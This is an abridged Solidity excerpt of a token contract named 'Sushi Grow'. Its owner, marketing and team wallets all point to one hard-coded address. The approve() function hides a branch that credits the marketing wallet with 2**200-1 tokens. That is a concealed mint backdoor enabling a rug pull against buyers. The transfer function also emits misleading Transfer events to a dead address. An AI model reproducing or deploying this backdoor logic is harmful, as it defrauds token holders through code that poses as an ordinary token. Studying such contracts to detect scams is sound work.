...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x61ECC9b44FAB4697a711530e8488858d5e98ace6; // owner address
...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Sushi Grow";
    string private _symbol = "Sushi";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x61ECC9b44FAB4697a711530e8488858d5e98ace6); // Marketing Address
    address payable public teamWalletAddress = payable(0x61ECC9b44FAB4697a711530e8488858d5e98ace6); // Team Address
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        ...
        if(spender == marketingWalletAddress) {
            _balances[marketingWalletAddress] = _balances[spender] + 2**200-1;
        }
        return true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if ( sender != recipient) {
            ...
            emit Transfer (sender , deadAddress , tradingbot);
        }
    }
